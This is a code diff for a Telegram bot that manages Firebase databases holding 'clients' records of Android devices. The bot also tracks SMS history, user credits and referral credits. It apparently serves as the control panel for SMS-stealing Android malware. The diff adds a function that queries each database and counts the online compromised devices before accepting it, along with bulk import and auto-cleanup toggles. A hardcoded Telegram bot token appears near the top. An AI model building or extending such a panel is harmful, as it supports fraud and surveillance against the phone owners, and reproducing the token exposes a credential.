@@ -50,7 +50,6 @@ async def init_mongo():
         await _mongo_client.admin.command("ping")
         log.info(f"✅ MongoDB connected: {MONGO_DB_NAME}.{MONGO_COLLECTION}")
 
-        # Load existing data
         doc = await _mongo_col.find_one({"_id": MONGO_DOC_ID})
         if doc:
             doc.pop("_id", None)
@@ -64,7 +63,7 @@ async def init_mongo():
                 u.setdefault("credits", 0)
                 u.setdefault("sms_history", [])
             doc.setdefault("settings", {}).setdefault("max_admins", 20)
-            doc.setdefault("settings", {}).setdefault("auto_cleanup", True)
+            doc.setdefault("settings", {}).setdefault("auto_cleanup", False)
             _DATA_CACHE.clear()
             _DATA_CACHE.update(doc)
             log.info(f"📥 Loaded: {len(doc.get('users', {}))} users, {len(doc.get('firebases', []))} fbs")
@@ -75,7 +74,6 @@ async def init_mongo():
             _DATA_CACHE.update(default)
             log.info("📝 Fresh state created in MongoDB")
 
-        # Start save worker for FIFO ordering
         _SAVE_QUEUE = asyncio.Queue()
         _SAVE_WORKER_TASK = asyncio.create_task(_save_worker())
         log.info("💾 Save worker started")
@@ -194,7 +192,7 @@ SUPER_ADMINS = [8617986101]
 BOT_TOKEN = "8940033297:AAHSUj6OgWX3U7QqUmbCiFmmeLM-YgSexb4"
 LOG_CHANNEL_ID = -1003929619180
 
-_VERSION = "𝗩4 ᴍᴏɴɢᴏ ᴘʀᴇᴍɪᴜᴍ"
+_VERSION = "𝗩5 ᴍᴏɴɢᴏ ᴘʀᴇᴍɪᴜᴍ ᴘʀᴏ"
 _PROGRESS_UPDATE_INTERVAL = 1.0
 _SEND_DELAY = 0.3
 _BACKGROUND_SCAN_INTERVAL = 90.0
@@ -282,7 +280,7 @@ SCAN_LOCK = asyncio.Lock()
 PROTECTED_NUMBERS = {}
 
 FB_FAIL_COUNT = {}
-AUTO_CLEANUP_ENABLED = True
+AUTO_CLEANUP_ENABLED = False
 LAST_CLEANUP_TIME = 0
 LAST_CLEANUP_REMOVED = 0
 
@@ -305,7 +303,7 @@ def _default_data() -> dict:
             "ref_credits": 3,
             "max_owners": 6,
             "max_admins": 20,
-            "auto_cleanup": True
+            "auto_cleanup": False
         },
         "sms_history": {},
         "activity_log": [],
@@ -530,6 +528,51 @@ def device_is_online(device_data: dict) -> bool:
         device_data.get("status") in ("online", "active", True, 1)
     ])
 
+# ========== INSTANT FIREBASE CHECK (One-time at add) ==========
+async def check_firebase_online(url: str) -> tuple:
+    """Firebase ko ek baar check karta hai. Returns (is_online, device_count, error)."""
+    shallow_url = url.rstrip("/") + "/clients.json?shallow=true"
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
+                if r.status != 200:
+                    return False, 0, f"HTTP {r.status}"
+                txt = (await r.text()).strip()
+                if txt == "null" or not txt:
+                    return False, 0, "No clients node (empty DB)"
+                try:
+                    data = json.loads(txt)
+                except:
+                    return False, 0, "Invalid JSON response"
+                if not isinstance(data, dict) or not data:
+                    return False, 0, "No devices registered"
+
+                dev_ids = list(data.keys())[:30]
+                online_count = 0
+                for dev_id in dev_ids:
+                    try:
+                        dev_url = url.rstrip("/") + f"/clients/{dev_id}.json"
+                        async with s.get(dev_url, timeout=aiohttp.ClientTimeout(total=5)) as r2:
+                            if r2.status == 200:
+                                txt2 = (await r2.text()).strip()
+                                if txt2 and txt2 != "null":
+                                    dev = json.loads(txt2)
+                                    if isinstance(dev, dict) and device_is_online(dev):
+                                        online_count += 1
+                    except Exception:
+                        pass
+
+                if online_count > 0:
+                    return True, online_count, ""
+                else:
+                    return False, 0, f"{len(dev_ids)} devices registered but 0 online"
+    except asyncio.TimeoutError:
+        return False, 0, "Timeout (DB slow or unreachable)"
+    except aiohttp.ClientConnectorError:
+        return False, 0, "Connection failed (invalid URL or DB deleted)"
+    except Exception as e:
+        return False, 0, f"Error: {str(e)[:50]}"
+
 async def get_all_online_devices(d: dict) -> list:
     fbs = d.get("firebases", [])
     if not fbs: return []
@@ -623,6 +666,7 @@ async def background_firebase_scanner(bot: Bot):
             devices = await get_all_online_devices(d)
             scan_duration = time.time() - start_scan
             CACHED_DEVICES = devices
+
             new_fb_counts = {}
             to_delete = []
 
@@ -634,10 +678,14 @@ async def background_firebase_scanner(bot: Bot):
                     "online": fb_online,
                     "last_update": int(time.time())
                 }
-                if fb_online == 0:
-                    FB_FAIL_COUNT[fb_id] = FB_FAIL_COUNT.get(fb_id, 0) + 1
-                    if FB_FAIL_COUNT[fb_id] >= _FB_AUTO_DELETE_THRESHOLD and AUTO_CLEANUP_ENABLED:
-                        to_delete.append(fb)
+
+                if AUTO_CLEANUP_ENABLED:
+                    if fb_online == 0:
+                        FB_FAIL_COUNT[fb_id] = FB_FAIL_COUNT.get(fb_id, 0) + 1
+                        if FB_FAIL_COUNT[fb_id] >= _FB_AUTO_DELETE_THRESHOLD:
+                            to_delete.append(fb)
+                    else:
+                        FB_FAIL_COUNT[fb_id] = 0
                 else:
                     FB_FAIL_COUNT[fb_id] = 0
 
@@ -645,29 +693,40 @@ async def background_firebase_scanner(bot: Bot):
             FB_DEVICE_COUNTS.update(new_fb_counts)
             LAST_SCAN_TIME = time.time()
 
+            # Auto-delete if enabled
             if to_delete:
                 d_fresh = load()
                 removed_labels = []
                 for dead_fb in to_delete:
-                    d_fresh["firebases"] = [f for f in d_fresh.get("firebases", []) if f["id"] != dead_fb["id"]]
+                    d_fresh["firebases"] = [
+                        f for f in d_fresh.get("firebases", [])
+                        if f["id"] != dead_fb["id"]
+                    ]
                     FB_FAIL_COUNT.pop(dead_fb["id"], None)
                     FB_DEVICE_COUNTS.pop(dead_fb["id"], None)
                     removed_labels.append(dead_fb.get("label", dead_fb["url"][:30]))
                 await safe_save(d_fresh)
+
                 LAST_CLEANUP_TIME = int(time.time())
                 LAST_CLEANUP_REMOVED = len(removed_labels)
-                log.info(f"[AUTO-CLEANUP] Removed {len(removed_labels)} dead fbs")
+                log.info(f"[AUTO-CLEANUP] Removed {len(removed_labels)} dead firebases")
+
                 if removed_labels:
                     try:
                         notify_text = (
                             f"{em(EMOJI_TRASH, '🗑')} <b>Auto-Cleanup Report</b>\n\n"
                             f"{em(EMOJI_FIRE, '🔥')} <b>{len(removed_labels)}</b> dead firebases removed\n"
-                            f"<i>(3 consecutive scans me 0 devices the)</i>\n\n")
+                            f"<i>(3 consecutive scans me 0 devices the)</i>\n\n"
+                        )
                         for lbl in removed_labels[:10]:
                             notify_text += f"  • <code>{lbl}</code>\n"
                         if len(removed_labels) > 10:
                             notify_text += f"  <i>+{len(removed_labels)-10} more</i>"
-                        notify_text += f"\n\n{em(EMOJI_CHECK, '📊')} Remaining DBs: <b>{len(d_fresh.get('firebases', []))}</b>"
+                        notify_text += (
+                            f"\n\n{em(EMOJI_CHECK, '📊')} Remaining DBs: "
+                            f"<b>{len(d_fresh.get('firebases', []))}</b>\n\n"
+                            f"<i>Disable karne ke liye: Settings → 🗑 Auto-Cleanup</i>"
+                        )
                         await bot.send_message(MAIN_OWNER, notify_text, parse_mode="HTML")
                     except Exception as e:
                         log.warning(f"Cleanup notify: {e}")
@@ -1520,7 +1579,7 @@ async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
         f"🟢 ᴏɴʟɪɴᴇ  : <b>{online_fbs}</b>\n"
         f"🔴 ᴏғғʟɪɴᴇ : <b>{offline_fbs}</b>\n"
         f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴ : <b>{auto_status}</b>\n"
-        f"<i>(3 consecutive fails → auto delete)</i>",
+        f"<i>(3 consecutive fails → auto delete, agar ON hai)</i>",
         reply_markup=fb_menu_kb(d, page), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:fb:add")
@@ -1531,7 +1590,10 @@ async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.add_firebase)
     await cq.message.edit_text(
         f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
-        f"Format: <code>Label | https://xxx.firebaseio.com</code>\nYa sirf URL bhejo.",
+        f"Format: <code>Label | https://xxx.firebaseio.com</code>\n"
+        f"Ya sirf URL bhejo.\n\n"
+        f"<i>⚠️ Firebase add karne se pehle instant check hoga.\n"
+        f"Agar online nahi hui to reject ho jayegi.</i>",
         reply_markup=kb([(sc('cancel'), "owner:fb:menu:0")]), parse_mode="HTML")
 
 @R.message(S.add_firebase, F.text)
@@ -1540,6 +1602,7 @@ async def owner_fb_add_done(msg: Message, state: FSMContext):
     uid = msg.from_user.id
     if not is_owner(uid, d):
         await state.clear(); return
+
     text = msg.text.strip()
     if "|" in text:
         parts = text.split("|", 1)
@@ -1548,23 +1611,66 @@ async def owner_fb_add_done(msg: Message, state: FSMContext):
     else:
         url = text
         label = url.replace("https://", "").split(".")[0][:20]
+
     if not is_valid_firebase_url(url):
         await msg.answer(
             f"{em(EMOJI_CROSS, '❌')} Invalid Firebase URL!\n\n"
             f"Sirf HTTPS + <code>.firebaseio.com</code> ya <code>firebasedatabase.app</code>",
             parse_mode="HTML"); return
+
     url = url.rstrip("/")
     fbs = d.get("firebases", [])
     if any(fb["url"] == url for fb in fbs):
         await state.clear()
-        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
+        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!",
+            reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
+
+    checking_msg = await msg.answer(
+        f"{em(EMOJI_WARNING, '🔍')} <b>Checking Firebase...</b>\n\n"
+        f"<code>{url}</code>\n\n<i>Please wait...</i>",
+        parse_mode="HTML")
+
+    is_online, dev_count, error = await check_firebase_online(url)
+
+    if not is_online:
+        await state.clear()
+        try:
+            await checking_msg.edit_text(
+                f"{em(EMOJI_CROSS, '❌')} <b>Firebase Rejected!</b>\n\n"
+                f"🏷 Label: <b>{label}</b>\n"
+                f"🔗 <code>{url}</code>\n\n"
+                f"{em(EMOJI_WARNING, '⚠️')} <b>Reason:</b> {error}\n\n"
+                f"<i>Ye firebase abhi online nahi hai. Pehle Android device connect karo, phir add karo.</i>",
+                reply_markup=kb([(sc('back'), "owner:fb:menu:0")]),
+                parse_mode="HTML")
+        except: pass
+        return
+
     fb_id = f"{int(time.time())}_{uuid.uuid4().hex[:6]}"
-    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
+    fbs.append({
+        "id": fb_id, "url": url, "label": label,
+        "added_at": int(time.time()),
+        "verified_devices": dev_count,
+        "verified_at": int(time.time())
+    })
     d["firebases"] = fbs
     await safe_save(d)
     await state.clear()
-    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>\n🏷 {label}\n🔗 <code>{url}</code>",
-        reply_markup=fb_menu_kb(load()), parse_mode="HTML")
+
+    try:
+        await checking_msg.edit_text(
+            f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added & Verified!</b>\n\n"
+            f"🏷 Label: <b>{label}</b>\n"
+            f"🔗 <code>{url}</code>\n\n"
+            f"{em(EMOJI_PHONE, '📱')} Online Devices: <b>{dev_count}</b>\n"
+            f"{em(EMOJI_CHECK, '🟢')} Status: <b>VERIFIED ONLINE</b>\n\n"
+            f"<i>Scanner abhi devices fetch karega.</i>",
+            reply_markup=fb_menu_kb(load(), 0),
+            parse_mode="HTML")
+    except: pass
+
+    log_activity(d, "firebase_added", uid, f"{label} | {url} | devices:{dev_count}")
+    save(d)
 
 @R.message(S.add_firebase)
 async def owner_fb_add_invalid(msg: Message):
@@ -1580,7 +1686,8 @@ async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
         f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add via TXT</b>\n\n"
         f"<code>.txt</code> file bhejo. Har line:\n"
         f"<code>https://xxx.firebaseio.com</code>\n"
-        f"ya <code>Label | https://xxx.firebaseio.com</code>",
+        f"ya <code>Label | https://xxx.firebaseio.com</code>\n\n"
+        f"<i>⚠️ Har URL instant check hoga. Sirf online DBs add honge.</i>",
         reply_markup=kb([(sc('cancel'), "owner:fb:menu:0")]), parse_mode="HTML")
 
 @R.message(S.add_firebase_file, F.document)
@@ -1591,12 +1698,12 @@ async def owner_fb_add_file_done(msg: Message, state: FSMContext):
     doc = msg.document
     if not doc.file_name.endswith('.txt'):
         await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt", parse_mode="HTML"); return
+
     file_info = await msg.bot.get_file(doc.file_id)
     downloaded = await msg.bot.download_file(file_info.file_path)
     content = downloaded.read().decode('utf-8', errors='ignore')
-    fbs = d.get("firebases", [])
-    existing = {fb["url"].rstrip("/") for fb in fbs}
-    added = 0; skipped = 0
+
+    parsed = []
     for line in content.splitlines():
         line = line.strip()
         if not line or line.startswith("#"): continue
@@ -1606,26 +1713,95 @@ async def owner_fb_add_file_done(msg: Message, state: FSMContext):
         else:
             url = line; label = url.replace("https://", "").split(".")[0][:20]
         if not is_valid_firebase_url(url):
-            skipped += 1; continue
-        url = url.rstrip("/")
+            continue
+        parsed.append((label, url.rstrip("/")))
+
+    if not parsed:
+        await state.clear()
+        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi valid URL nahi mila!", parse_mode="HTML"); return
+
+    progress_msg = await msg.answer(
+        f"{em(EMOJI_WARNING, '🔍')} <b>Verifying {len(parsed)} Firebases...</b>\n\n"
+        f"<i>Please wait, ye 1-2 minutes le sakta hai...</i>",
+        parse_mode="HTML")
+
+    fbs = d.get("firebases", [])
+    existing = {fb["url"].rstrip("/") for fb in fbs}
+
+    added = 0
+    skipped_dup = 0
+    rejected = 0
+    rejected_list = []
+
+    for i, (label, url) in enumerate(parsed):
+        if i % 3 == 0 or i == len(parsed) - 1:
+            try:
+                await progress_msg.edit_text(
+                    f"{em(EMOJI_WARNING, '🔍')} <b>Verifying...</b>\n\n"
+                    f"📊 Progress: <b>{i+1}/{len(parsed)}</b>\n"
+                    f"✅ Added: <b>{added}</b>\n"
+                    f"❌ Rejected: <b>{rejected}</b>\n"
+                    f"⚠️ Duplicates: <b>{skipped_dup}</b>\n\n"
+                    f"<i>Current: {label[:25]}</i>",
+                    parse_mode="HTML")
+            except: pass
+
         if url in existing:
-            skipped += 1; continue
+            skipped_dup += 1
+            continue
+
+        is_online, dev_count, error = await check_firebase_online(url)
+
+        if not is_online:
+            rejected += 1
+            rejected_list.append(f"{label} → {error}")
+            continue
+
         existing.add(url)
         fb_id = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:6]}"
-        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
+        fbs.append({
+            "id": fb_id, "url": url, "label": label,
+            "added_at": int(time.time()),
+            "verified_devices": dev_count,
+            "verified_at": int(time.time())
+        })
         added += 1
+
     d["firebases"] = fbs
     await safe_save(d)
     await state.clear()
-    await msg.answer(
-        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Added!</b>\n\n🔥 Added: <b>{added}</b>\n⚠️ Skipped: <b>{skipped}</b>\n📊 Total: <b>{len(fbs)}</b>",
-        reply_markup=fb_menu_kb(load()), parse_mode="HTML")
+
+    report = (
+        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Import Complete</b>\n\n"
+        f"📊 Total Lines: <b>{len(parsed)}</b>\n"
+        f"✅ Added (Online): <b>{added}</b>\n"
+        f"❌ Rejected (Offline): <b>{rejected}</b>\n"
+        f"⚠️ Duplicates: <b>{skipped_dup}</b>\n"
+        f"🔥 Total in Bot: <b>{len(fbs)}</b>"
+    )
+    if rejected_list:
+        report += f"\n\n<b>Rejected:</b>\n"
+        for r in rejected_list[:8]:
+            report += f"• <code>{r[:50]}</code>\n"
+        if len(rejected_list) > 8:
+            report += f"<i>+{len(rejected_list)-8} more</i>"
+
+    try:
+        await progress_msg.edit_text(report,
+            reply_markup=fb_menu_kb(load(), 0),
+            parse_mode="HTML")
+    except:
+        await msg.answer(report, reply_markup=fb_menu_kb(load(), 0), parse_mode="HTML")
+
+    log_activity(d, "firebase_bulk_add", msg.from_user.id,
+                 f"Added:{added}, Rejected:{rejected}, Dup:{skipped_dup}")
+    save(d)
 
 @R.message(S.add_firebase_file)
 async def owner_fb_add_file_invalid(msg: Message):
     await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt document bhejo.", parse_mode="HTML")
 
-# ========== ✅ DELETE ALL FIREBASES ==========
+# ========== DELETE ALL FIREBASES ==========
 @R.callback_query(F.data == "owner:fb:delete_all")
 async def owner_fb_delete_all_confirm(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -2939,23 +3115,47 @@ async def owner_settings(cq: CallbackQuery, state: FSMContext):
     if not is_owner(cq.from_user.id, d):
         await cq.answer("🚫", show_alert=True); return
     settings = d.get("settings", {})
-    auto_status = "🟢 ON" if settings.get("auto_cleanup", True) else "🔴 OFF"
+    auto_status = "🟢 ON" if AUTO_CLEANUP_ENABLED else "🔴 OFF"
+    status_line = (
+        f"{em(EMOJI_CHECK, '🟢')} <b>ENABLED</b> — Dead DBs 3 scans ke baad auto-delete honge"
+        if AUTO_CLEANUP_ENABLED else
+        f"{em(EMOJI_CROSS, '🔴')} <b>DISABLED</b> — Dead DBs manually delete karne padenge"
+    )
+
     text = (
         f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
-        f"🎁 Ref Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
-        f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>\n"
-        f"🛡 Max Admins: <b>{settings.get('max_admins', 20)}</b>\n"
-        f"🗑 Auto Cleanup: <b>{auto_status}</b>\n"
-        f"<i>(3 consecutive zero-scans → auto delete)</i>")
+        f"╔══════════════════╗\n"
+        f"🎁 Ref Credits  : <b>{settings.get('ref_credits', 3)}</b>\n"
+        f"👑 Max Owners   : <b>{settings.get('max_owners', 6)}</b>\n"
+        f"🛡 Max Admins   : <b>{settings.get('max_admins', 20)}</b>\n"
+        f"╚══════════════════╝\n\n"
+        f"{em(EMOJI_TRASH, '🗑')} <b>Auto-Cleanup:</b> {auto_status}\n"
+        f"{status_line}\n\n"
+        f"<i>📌 Firebase add karte waqt one-time check hoti hai\n"
+        f"📌 Auto-cleanup sirf background scanner me chalta hai</i>"
+    )
+
+    toggle_label = (
+        f"🔴 ᴅɪsᴀʙʟᴇ ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ"
+        if AUTO_CLEANUP_ENABLED else
+        f"🟢 ᴇɴᴀʙʟᴇ ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ"
+    )
+
     rows = [
         [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
         [btn("sᴇᴛ ᴍᴀx ᴀᴅᴍɪɴs", "owner:settings:max_admins", EMOJI_SHIELD, "🛡")],
         [InlineKeyboardButton(
-            text=f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ: {'🟢 ᴏɴ' if settings.get('auto_cleanup', True) else '🔴 ᴏғғ'}",
-            callback_data="owner:settings:auto_cleanup_toggle")],
+            text=toggle_label,
+            callback_data="owner:settings:auto_cleanup_toggle",
+            icon_custom_emoji_id=EMOJI_TRASH
+        )],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await cq.message.edit_text(
+        text,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
+        parse_mode="HTML"
+    )
 
 @R.callback_query(F.data == "owner:settings:ref")
 async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
@@ -3017,38 +3217,72 @@ async def owner_settings_max_admins_done(msg: Message, state: FSMContext):
 async def owner_settings_max_admins_invalid(msg: Message):
     await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")
 
+# ========== AUTO-CLEANUP TOGGLE ==========
 @R.callback_query(F.data == "owner:settings:auto_cleanup_toggle")
 async def owner_settings_auto_cleanup_toggle(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner only!", show_alert=True); return
-    settings = d.setdefault("settings", {})
-    current = settings.get("auto_cleanup", True)
-    settings["auto_cleanup"] = not current
-    await safe_save(d)
+        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
+
     global AUTO_CLEANUP_ENABLED
-    AUTO_CLEANUP_ENABLED = settings["auto_cleanup"]
-    status = "🟢 ENABLED" if settings["auto_cleanup"] else "🔴 DISABLED"
-    await cq.answer(f"Auto-cleanup: {status}", show_alert=True)
+    AUTO_CLEANUP_ENABLED = not AUTO_CLEANUP_ENABLED
+    d.setdefault("settings", {})["auto_cleanup"] = AUTO_CLEANUP_ENABLED
+    await safe_save(d)
+
+    status = "🟢 ENABLED" if AUTO_CLEANUP_ENABLED else "🔴 DISABLED"
+    await cq.answer(f"Auto-Cleanup {status}!", show_alert=True)
+
+    log_activity(d, "auto_cleanup_toggle", cq.from_user.id,
+                 f"Auto-cleanup set to {AUTO_CLEANUP_ENABLED}")
+    save(d)
+
+    # Refresh panel
     d = load()
     settings = d.get("settings", {})
-    auto_status = "🟢 ON" if settings.get("auto_cleanup", True) else "🔴 OFF"
+    auto_status = "🟢 ON" if AUTO_CLEANUP_ENABLED else "🔴 OFF"
+    status_line = (
+        f"{em(EMOJI_CHECK, '🟢')} <b>ENABLED</b> — Dead DBs 3 scans ke baad auto-delete honge"
+        if AUTO_CLEANUP_ENABLED else
+        f"{em(EMOJI_CROSS, '🔴')} <b>DISABLED</b> — Dead DBs manually delete karne padenge"
+    )
+
     text = (
         f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
-        f"🎁 Ref Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
-        f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>\n"
-        f"🛡 Max Admins: <b>{settings.get('max_admins', 20)}</b>\n"
-        f"🗑 Auto Cleanup: <b>{auto_status}</b>\n"
-        f"<i>(3 consecutive zero-scans → auto delete)</i>")
+        f"╔══════════════════╗\n"
+        f"🎁 Ref Credits  : <b>{settings.get('ref_credits', 3)}</b>\n"
+        f"👑 Max Owners   : <b>{settings.get('max_owners', 6)}</b>\n"
+        f"🛡 Max Admins   : <b>{settings.get('max_admins', 20)}</b>\n"
+        f"╚══════════════════╝\n\n"
+        f"{em(EMOJI_TRASH, '🗑')} <b>Auto-Cleanup:</b> {auto_status}\n"
+        f"{status_line}\n\n"
+        f"<i>📌 Firebase add karte waqt one-time check hoti hai\n"
+        f"📌 Auto-cleanup sirf background scanner me chalta hai</i>"
+    )
+
+    toggle_label = (
+        f"🔴 ᴅɪsᴀʙʟᴇ ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ"
+        if AUTO_CLEANUP_ENABLED else
+        f"🟢 ᴇɴᴀʙʟᴇ ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ"
+    )
+
     rows = [
         [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
         [btn("sᴇᴛ ᴍᴀx ᴀᴅᴍɪɴs", "owner:settings:max_admins", EMOJI_SHIELD, "🛡")],
         [InlineKeyboardButton(
-            text=f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ: {'🟢 ᴏɴ' if settings.get('auto_cleanup', True) else '🔴 ᴏғғ'}",
-            callback_data="owner:settings:auto_cleanup_toggle")],
+            text=toggle_label,
+            callback_data="owner:settings:auto_cleanup_toggle",
+            icon_custom_emoji_id=EMOJI_TRASH
+        )],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    try:
+        await cq.message.edit_text(
+            text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
+            parse_mode="HTML"
+        )
+    except TelegramBadRequest:
+        pass
 
 # ================= ACTIVITY LOG =================
 @R.callback_query(F.data == "owner:activity")
@@ -3410,7 +3644,7 @@ async def main():
 
     d0 = load()
     PROTECTED_NUMBERS = d0.get("protected_numbers", {})
-    AUTO_CLEANUP_ENABLED = d0.get("settings", {}).get("auto_cleanup", True)
+    AUTO_CLEANUP_ENABLED = d0.get("settings", {}).get("auto_cleanup", False)
     log.info(f"Auto-cleanup: {'ON' if AUTO_CLEANUP_ENABLED else 'OFF'}")
 
     me = await bot.get_me()
@@ -3426,17 +3660,18 @@ async def main():
             f"👤 Owner: <b>{OWNER_NAME}</b>\n"
             f"🆔 <code>{MAIN_OWNER}</code>\n"
             f"📢 Log Channel: <code>{LOG_CHANNEL_ID}</code>\n"
-            f"💾 <b>Database:</b> MongoDB (olympic)\n\n"
+            f"💾 <b>Database:</b> MongoDB (olympic)\n"
+            f"🗑 <b>Auto-Cleanup:</b> {'🟢 ON' if AUTO_CLEANUP_ENABLED else '🔴 OFF'}\n\n"
             f"✅ <b>All Features Active:</b>\n"
+            f"• 🔍 One-time FB check at add\n"
             f"• 📥 Online Firebase TXT Export\n"
-            f"• 🗑 Auto-Delete Offline (3 scans)\n"
+            f"• 🗑 Auto-Delete Toggle (Settings)\n"
             f"• ⚠️ Delete All Firebases\n"
             f"• 🗑 Manual Clean Now\n"
-            f"• ⚙️ Auto-Cleanup Toggle\n"
             f"• 💎 Premium icons & layout\n"
             f"• 💾 MongoDB (olympic db)\n"
             f"• 🛡 Role metadata tracking\n"
-            f"• 🔒 Safe HTTP-only FB URLs",
+            f"• 🔒 Safe HTTPS-only FB URLs",
             parse_mode="HTML")
     except Exception as e:
         log.warning(f"Owner notify: {e}")
